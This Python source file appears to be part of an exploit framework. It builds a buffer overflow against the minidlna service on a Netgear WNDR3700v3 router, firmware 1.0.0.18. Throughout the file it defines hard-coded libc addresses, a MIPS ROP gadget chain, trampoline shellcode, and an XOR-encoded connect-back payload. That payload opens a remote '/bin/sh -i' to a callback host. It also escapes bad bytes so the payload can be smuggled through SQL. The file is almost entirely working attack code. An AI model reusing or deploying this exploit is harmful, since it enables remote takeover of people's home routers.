import signal
import os
import struct


from crossbow.overflow_development.overflowbuilder import OverflowBuffer,SectionCreator
from crossbow.common.support import LittleEndian
from crossbow.common.support import Logging
from crossbow.servers import ConnectbackHost
from crossbow.servers.callback_server import ConnectbackServer
from crossbow.payloads.mips.callback_payload import CallbackPayload
from crossbow.payloads.mips.trampoline import Trampoline
from crossbow.encoders.mips import MipsXorEncoder

class WNDR3700v3(object):
    endianness=LittleEndian
    overflow_len=2048
    #bad sql bytes and their sqlite escaped equivalents
    minidlna_badbytes={'\x20':"x'20'",
                        '\x0d':"x'0d'",
                        '\x2d':"x'2d'"}

    def __init__(self,callback_ip_address,port,target_ip_address,logger=None):
        self.logger=logger
        if not self.logger:
            self.logger=Logging()
        #"/usr/sbin/telnetd -p 31337"
        #"/bin/sh -i"
        self.connectback_host=ConnectbackHost(callback_ip_address,port)
        
        self.connectback_server=ConnectbackServer(self.connectback_host,
                                        startcmd="/bin/sh -i")
                                        
        
        self.endianness=self.__class__.endianness
        self.overflow_len=self.__class__.overflow_len
    
    def scan_for_nulls(self):
        return self.overflow_data.scan_for_nulls()

    def chunks(self,chunklen):
        string=self.overflow_data.overflow_string

        chunks=[]
        badchar_replacements=self.minidlna_badbytes
        while len(string) > 0:
            newstring = ""
            for i in range(0,chunklen):
                if len(string) <= 0:
                    break
                newstring+=string[0]
                string=string[1:]
            for k,v in badchar_replacements.items():
                if k in newstring:
                    self.logger.LOG_DEBUG("replacing with "+v)
                    newstring=newstring.replace(k,'\"||'+v+'||\"')
            chunks.append(newstring)

        return chunks
    def find(self,find_string):
        if find_string.startswith('0x'):
            find_string=struct.pack("<L",int(find_string,16))
        return self.overflow_data.find_offset(find_string)

    def serve_connectback(self):
        self.pid = self.connectback_server.serve_connectback()
        return self.pid

    def wait_connectback(self,kill=False):
        if self.pid:
            if(kill):
                os.kill(self.pid,signal.SIGTERM)
            return self.connectback_server.wait()


class WNDR3700v3_10018(WNDR3700v3):
    vesion_string="1.0.0.18"
    libc_actual=0x2af34000
    libc_qemu=0x4084a000
    libavcodec_actual=0x2b0a8000
    libavcodec_qemu=0
    
    @classmethod
    def minidlna_rop_gadgets(cls,target_ip_address,qemu=False):
        libc=0
        #libavcodec=0
        badbyte_list=['\x00']
        for k in cls.minidlna_badbytes.keys():
            badbyte_list.append(k)

        if qemu:
            libc=cls.libc_qemu
            #libavcodec=cls.libavcodec_qemu
        else:
            libc=cls.libc_actual
            #libavcodec=cls.libavcodec_actual
        
        sc=SectionCreator(cls.endianness,base_address=libc,badchars=badbyte_list)
        
        offset_modifier=len(target_ip_address)
        print "offset_modifier: %d" % offset_modifier

        reg_ra=600-offset_modifier
        reg_s0=564-offset_modifier
        reg_s1=568-offset_modifier
        reg_s2=572-offset_modifier
        reg_s3=576-offset_modifier
        reg_s4=580-offset_modifier
        reg_s6=588-offset_modifier

        gadgets=[]
        
        #placeholders one and two get added together and passed as dst into memcpy(). They must add
        #up to be a writable address."
        
        gadget=sc.gadget_section(
                #752-offset_modifier,
                736-offset_modifier,
                0x15a3c932,
                base_address=0,
                description="placeholder 1 to avoid crashing memcpy.")
        gadgets.append(gadget)


        gadget=sc.gadget_section(
                752-offset_modifier,
                0x15a3c932,
                base_address=0,
                description="placeholder 2 to avoid crashing memcpy.")
        gadgets.append(gadget)


        #load 1 into $a0, jalr $s3
        gadget=sc.gadget_section(reg_ra,
                0x00025110,
                description="reg $ra. set up 3 sec arg to sleep(). jalr $s6.")
        gadgets.append(gadget)

        #load stack data into $ra, jr $s1
        gadget=sc.gadget_section(reg_s6,
                0x0001D95C,
                description="[reg $s6] setup ra before sleep(). jr $s1")
        gadgets.append(gadget)

        #address of sleep
        gadget=sc.gadget_section(reg_s1,
                0x506c0,
                description="[reg $s1] Address of sleep() in libc. be sure to set up $ra and $a0 before calling.",)
        gadgets.append(gadget)
        
        #[reg $s3] placeholder that allows $s3 to be dereferenced without crashing.

        gadget=sc.gadget_section(reg_s3,
                0x00011918,
                description="[reg $s3] placeholder that allows $s3 to be dereferenced without crashing.")
        gadgets.append(gadget)

        #[reg $ra] offset from $sp into $a2, jalr $s1.

        gadget=sc.gadget_section(640-offset_modifier,
                0x00011918,
                description="[reg $ra] offset from $sp into $a2, jalr $s1.")
        gadgets.append(gadget)
        
        #move $a2 to $s0, jalr $s4
        gadget=sc.gadget_section(632-offset_modifier,
                0x0003434C,
                description="[reg $s0] move $a2 to $s0, jalr $s4")
        gadgets.append(gadget)
        
        
        gadget=sc.gadget_section(reg_s4,
                0x0000BA84,
                description="[reg $s4] jalr $s0")
        gadgets.append(gadget)

        return gadgets

    def build_overflow(self,target_ip_address,encoder_class=None,qemu=False):
        badbyte_list=['\x00']
        for k in self.__class__.minidlna_badbytes.keys():
            badbyte_list.append(k)
            
        sc=SectionCreator(self.endianness,badchars=badbyte_list)
        
        #Must take into account length if IP addr
        #since it's part of the sprintf() that overflows
        offset_modifier=len(target_ip_address)

        sections=self.__class__.minidlna_rop_gadgets(target_ip_address,qemu)
        
        trampoline_1=Trampoline(self.endianness,-672)
        section=sc.string_section(684-offset_modifier,
                            trampoline_1.shellcode,
                            description="First trampoline payload, jump back 672")
        sections.append(section)

        #1028, or 0x404, is the smallest operand to MIPS beq that
        #can >>2 bits and still have both bytes be non-null
        trampoline_2=Trampoline(self.endianness,1028)
        section=sc.string_section(16-offset_modifier,
                        trampoline_2.shellcode,
                        description="Second trampoline payload, jump forward 1028 ")
        sections.append(section)

        payload=CallbackPayload(self.connectback_host,self.endianness)
        if encoder_class:
            encoded_payload=encoder_class(payload,self.endianness,badbyte_list)
            payload=encoded_payload
        
        
        section=sc.string_section(1048-offset_modifier,
                        payload.shellcode,
                        description="connect-back payload")
        sections.append(section)
        

        buf=OverflowBuffer(self.overflow_len,sections,logger=self.logger)

        return buf

    def __init__(self,callback_ip_address,port,target_ip_address,encode=True,qemu=False,logger=None):
        super(self.__class__,self).__init__(callback_ip_address,port,target_ip_address,logger)
        self.encoder_class=None
        
        if encode:
            self.encoder_class=MipsXorEncoder
        
        self.overflow_data=self.build_overflow(target_ip_address,self.encoder_class,qemu)
        pass

class WNDR3700v3_10022(WNDR3700v3):
    pass

WNDR3700_VERSIONS={"1.0.0.18":WNDR3700v3_10018,
                    "1.0.0.22":WNDR3700v3_10022}
